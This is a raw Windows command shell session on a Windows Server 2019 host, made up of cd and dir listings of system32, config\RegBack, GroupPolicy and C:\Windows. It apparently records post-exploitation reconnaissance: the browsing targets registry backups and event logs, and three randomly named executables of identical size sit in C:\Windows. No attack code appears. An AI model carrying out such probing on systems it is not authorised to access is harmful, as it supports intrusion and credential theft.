09/15/2018  09:13 AM            55,808 xwizard.exe
09/15/2018  09:13 AM           376,320 xwizards.dll
09/15/2018  09:13 AM            98,816 xwreg.dll
09/15/2018  09:13 AM           207,360 xwtpdui.dll
09/15/2018  09:13 AM           119,808 xwtpw32.dll
09/07/2019  02:22 AM    <DIR>          zh-CN
09/15/2018  11:06 AM    <DIR>          zh-TW
09/15/2018  09:13 AM            67,072 zipcontainer.dll
09/07/2019  02:20 AM           374,784 zipfldr.dll
09/15/2018  09:13 AM            25,088 ztrace_maps.dll
            2675 File(s)    997,949,390 bytes
              91 Dir(s)  25,198,800,896 bytes free

C:\Windows\system32> dir /ad 
 Volume in drive C is Windows 2019
 Volume Serial Number is A87E-BFF5

 Directory of C:\Windows\system32

04/13/2025  07:11 PM    <DIR>          .
04/13/2025  07:11 PM    <DIR>          ..
09/15/2018  11:06 AM    <DIR>          0409
04/13/2025  07:10 PM    <DIR>          1033
09/15/2018  09:19 AM    <DIR>          AdvancedInstallers
09/15/2018  09:19 AM    <DIR>          AppLocker
09/15/2018  11:06 AM    <DIR>          ar-SA
04/13/2025  06:54 PM    <DIR>          BestPractices
09/15/2018  11:06 AM    <DIR>          bg-BG
09/15/2018  09:19 AM    <DIR>          Bthprops
09/15/2018  09:19 AM    <DIR>          catroot
09/15/2018  11:06 AM    <DIR>          com
09/15/2018  09:19 AM    <DIR>          config
09/15/2018  09:19 AM    <DIR>          Configuration
09/15/2018  11:06 AM    <DIR>          cs-CZ
09/15/2018  11:06 AM    <DIR>          da-DK
09/15/2018  11:06 AM    <DIR>          de-DE
09/15/2018  11:06 AM    <DIR>          DiagSvcs
09/07/2019  02:22 AM    <DIR>          Dism
09/15/2018  09:19 AM    <DIR>          downlevel
09/15/2018  11:06 AM    <DIR>          drivers
09/15/2018  11:06 AM    <DIR>          DriverStore
09/15/2018  11:06 AM    <DIR>          el-GR
09/15/2018  11:06 AM    <DIR>          en
09/15/2018  11:06 AM    <DIR>          en-GB
04/13/2025  06:56 PM    <DIR>          en-US
09/15/2018  11:06 AM    <DIR>          es-ES
09/15/2018  11:06 AM    <DIR>          es-MX
09/15/2018  11:06 AM    <DIR>          et-EE
09/15/2018  11:06 AM    <DIR>          F12
09/15/2018  11:06 AM    <DIR>          fi-FI
09/15/2018  11:06 AM    <DIR>          fr-CA
09/15/2018  11:06 AM    <DIR>          fr-FR
09/15/2018  09:19 AM    <DIR>          GroupPolicy
09/15/2018  09:19 AM    <DIR>          GroupPolicyUsers
09/15/2018  11:06 AM    <DIR>          he-IL
09/15/2018  11:06 AM    <DIR>          hr-HR
09/15/2018  11:06 AM    <DIR>          hu-HU
09/15/2018  09:19 AM    <DIR>          icsxml
09/15/2018  09:19 AM    <DIR>          IME
04/13/2025  06:56 PM    <DIR>          inetsrv
09/15/2018  09:19 AM    <DIR>          InputMethod
09/15/2018  09:19 AM    <DIR>          InstallShield
09/15/2018  09:19 AM    <DIR>          Ipmi
09/15/2018  11:06 AM    <DIR>          it-IT
09/15/2018  11:06 AM    <DIR>          ja-JP
09/15/2018  11:06 AM    <DIR>          ko-KR
09/15/2018  09:19 AM    <DIR>          Licenses
09/15/2018  09:19 AM    <DIR>          LogFiles
09/15/2018  11:06 AM    <DIR>          lt-LT
09/15/2018  11:06 AM    <DIR>          lv-LV
09/15/2018  11:08 AM    <DIR>          Macromed
04/13/2025  06:54 PM    <DIR>          migration
09/15/2018  09:19 AM    <DIR>          migwiz
09/15/2018  09:19 AM    <DIR>          MSDRM
09/15/2018  09:19 AM    <DIR>          Msdtc
09/15/2018  11:06 AM    <DIR>          MUI
09/15/2018  11:06 AM    <DIR>          nb-NO
09/15/2018  09:19 AM    <DIR>          NDF
09/15/2018  09:19 AM    <DIR>          networklist
09/15/2018  11:06 AM    <DIR>          nl-NL
09/15/2018  09:19 AM    <DIR>          Nui
09/07/2019  02:22 AM    <DIR>          oobe
09/15/2018  11:06 AM    <DIR>          pl-PL
09/15/2018  11:06 AM    <DIR>          Printing_Admin_Scripts
09/15/2018  11:06 AM    <DIR>          pt-BR
09/15/2018  11:06 AM    <DIR>          pt-PT
09/15/2018  09:19 AM    <DIR>          ras
09/15/2018  09:19 AM    <DIR>          RasToast
09/15/2018  09:19 AM    <DIR>          Recovery
09/15/2018  11:06 AM    <DIR>          ro-RO
09/15/2018  11:06 AM    <DIR>          ru-RU
09/15/2018  11:06 AM    <DIR>          setup
09/15/2018  11:06 AM    <DIR>          sk-SK
09/15/2018  11:06 AM    <DIR>          sl-SI
09/15/2018  11:06 AM    <DIR>          slmgr
09/15/2018  09:19 AM    <DIR>          SMI
09/15/2018  09:19 AM    <DIR>          Speech
09/15/2018  09:19 AM    <DIR>          Speech_OneCore
09/15/2018  09:19 AM    <DIR>          spp
09/15/2018  09:19 AM    <DIR>          sppui
09/15/2018  11:06 AM    <DIR>          sr-Latn-RS
09/15/2018  11:06 AM    <DIR>          sv-SE
09/15/2018  11:06 AM    <DIR>          sysprep
09/15/2018  09:19 AM    <DIR>          Tasks
09/07/2019  02:22 AM    <DIR>          th-TH
09/15/2018  11:06 AM    <DIR>          tr-TR
09/07/2019  02:22 AM    <DIR>          uk-UA
09/07/2019  02:22 AM    <DIR>          wbem
09/15/2018  11:06 AM    <DIR>          WCN
09/15/2018  09:19 AM    <DIR>          WindowsPowerShell
09/15/2018  09:19 AM    <DIR>          WinMetadata
09/15/2018  11:06 AM    <DIR>          winrm
09/07/2019  02:22 AM    <DIR>          zh-CN
09/15/2018  11:06 AM    <DIR>          zh-TW
               0 File(s)              0 bytes
              95 Dir(s)  25,198,211,072 bytes free



C:\Windows\System32\config\RegBack> cd ..

C:\Windows\System32\config> cd ..

C:\Windows\System32> cd winevt
The system cannot find the path specified.

C:\Windows\System32> cd winevt
The system cannot find the path specified.

C:\Windows\System32> cd grouppolicy

C:\Windows\System32\GroupPolicy> dir
 Volume in drive C is Windows 2019
 Volume Serial Number is A87E-BFF5

 Directory of C:\Windows\System32\GroupPolicy

09/15/2018  09:19 AM    <DIR>          .
09/15/2018  09:19 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  25,198,153,728 bytes free

C:\Windows\System32\GroupPolicy> cd ..

C:\Windows\System32> cd ..       

C:\Windows> dir
 Volume in drive C is Windows 2019
 Volume Serial Number is A87E-BFF5

 Directory of C:\Windows

08/27/2025  12:31 PM    <DIR>          .
08/27/2025  12:31 PM    <DIR>          ..
09/15/2018  09:19 AM    <DIR>          ADFS
04/14/2025  07:12 PM    <DIR>          appcompat
09/07/2019  02:22 AM    <DIR>          apppatch
04/20/2025  03:51 PM    <DIR>          AppReadiness
04/13/2025  07:29 PM    <DIR>          assembly
09/15/2018  09:19 AM    <DIR>          bcastdvr
09/15/2018  09:12 AM            78,848 bfsvc.exe
09/15/2018  09:19 AM    <DIR>          Boot
09/15/2018  09:19 AM    <DIR>          Branding
04/13/2025  07:14 PM    <DIR>          CbsTemp
09/15/2018  09:19 AM    <DIR>          Containers
09/15/2018  09:19 AM    <DIR>          Cursors
04/13/2025  06:38 PM    <DIR>          debug
09/07/2019  02:20 AM           232,960 DfsrAdmin.exe
09/07/2019  02:21 AM             1,315 DfsrAdmin.exe.config
06/13/2024  03:55 PM             1,908 diagerr.xml
09/15/2018  09:19 AM    <DIR>          diagnostics
06/13/2024  03:55 PM             1,908 diagwrn.xml
09/15/2018  11:06 AM    <DIR>          DigitalLocker
09/15/2018  09:19 AM    <DIR>          drivers
04/13/2025  06:09 PM             4,056 DtcInstall.log
09/15/2018  11:06 AM    <DIR>          en-US
09/07/2019  02:20 AM         4,353,016 explorer.exe
08/27/2025  11:34 AM            56,320 FkIqcFlR.exe
09/15/2018  09:19 AM    <DIR>          Globalization
09/15/2018  11:06 AM    <DIR>          Help
09/07/2019  02:20 AM         1,071,616 HelpPane.exe
09/15/2018  09:12 AM            18,432 hh.exe
09/15/2018  09:19 AM    <DIR>          IdentityCRL
04/13/2025  06:57 PM            94,571 iis.log
09/15/2018  11:06 AM    <DIR>          IME
06/13/2024  03:55 PM    <DIR>          ImmersiveControlPanel
08/13/2025  04:09 PM    <DIR>          INF
09/15/2018  09:19 AM    <DIR>          InputMethod
09/15/2018  09:19 AM    <DIR>          L2Schemas
09/15/2018  09:19 AM    <DIR>          LiveKernelReports
06/13/2024  06:58 AM    <DIR>          Logs
06/13/2024  03:55 PM             1,380 lsasetup.log
09/15/2018  09:12 AM            43,131 mib.bin
08/27/2025  02:05 AM    <DIR>          Microsoft.NET
09/15/2018  09:19 AM    <DIR>          Migration
09/15/2018  09:19 AM    <DIR>          ModemLogs
08/27/2025  12:31 PM            56,320 MuJcBTxd.exe
09/07/2019  02:20 AM           254,464 notepad.exe
09/15/2018  11:07 AM    <DIR>          OCR
09/15/2018  09:19 AM    <DIR>          Offline Web Pages
04/13/2025  06:09 PM    <DIR>          Panther
09/15/2018  09:19 AM    <DIR>          Performance
08/13/2025  04:05 PM             2,770 PFRO.log
09/15/2018  09:19 AM    <DIR>          PLA
09/07/2019  02:22 AM    <DIR>          PolicyDefinitions
06/13/2024  03:55 PM    <DIR>          Prefetch
06/13/2024  03:55 PM    <DIR>          PrintDialog
09/15/2018  09:19 AM    <DIR>          Provisioning
09/07/2019  02:20 AM           358,400 regedit.exe
08/27/2025  12:21 AM    <DIR>          Registration
09/15/2018  09:19 AM    <DIR>          RemotePackages
09/15/2018  09:19 AM    <DIR>          rescache
09/15/2018  09:19 AM    <DIR>          Resources
09/15/2018  09:19 AM    <DIR>          SchCache
09/15/2018  09:19 AM    <DIR>          schemas
09/15/2018  09:19 AM    <DIR>          security
09/15/2018  09:13 AM            30,914 ServerDataCenterEval.xml
04/13/2025  07:00 PM    <DIR>          ServiceProfiles
09/15/2018  09:19 AM    <DIR>          ServiceState
09/15/2018  11:07 AM    <DIR>          servicing
09/15/2018  09:21 AM    <DIR>          Setup
06/13/2024  03:55 PM               511 setupact.log
06/13/2024  03:55 PM                 0 setuperr.log
09/07/2019  02:22 AM    <DIR>          ShellComponents
09/07/2019  02:22 AM    <DIR>          ShellExperiences
09/15/2018  09:19 AM    <DIR>          SKB
04/13/2025  06:13 PM    <DIR>          SoftwareDistribution
09/15/2018  09:19 AM    <DIR>          Speech
09/15/2018  09:19 AM    <DIR>          Speech_OneCore
09/07/2019  02:20 AM           132,608 splwow64.exe
09/15/2018  09:19 AM    <DIR>          System
09/15/2018  09:16 AM               219 system.ini
08/13/2025  04:09 PM    <DIR>          System32
09/15/2018  09:19 AM    <DIR>          SystemApps
09/15/2018  09:19 AM    <DIR>          SystemResources
04/13/2025  07:11 PM    <DIR>          SysWOW64
09/15/2018  09:19 AM    <DIR>          TAPI
06/13/2024  03:55 PM    <DIR>          Tasks
08/27/2025  04:58 AM    <DIR>          Temp
09/07/2019  02:22 AM    <DIR>          TextInput
09/15/2018  09:19 AM    <DIR>          tracing
09/15/2018  09:19 AM    <DIR>          twain_32
09/15/2018  09:13 AM            64,512 twain_32.dll
09/15/2018  09:19 AM    <DIR>          Vss
09/15/2018  09:19 AM    <DIR>          WaaS
09/15/2018  09:19 AM    <DIR>          Web
09/15/2018  09:16 AM                92 win.ini
08/27/2025  11:14 AM               276 WindowsUpdate.log
09/15/2018  09:13 AM            11,776 winhlp32.exe
04/20/2025  07:12 PM    <DIR>          WinSxS
09/15/2018  09:12 AM           316,640 WMSysPr9.prx
09/15/2018  09:12 AM            11,264 write.exe
08/27/2025  11:44 AM            56,320 Zalxttmj.exe
              29 File(s)      7,256,547 bytes
              72 Dir(s)  25,197,760,512 bytes free
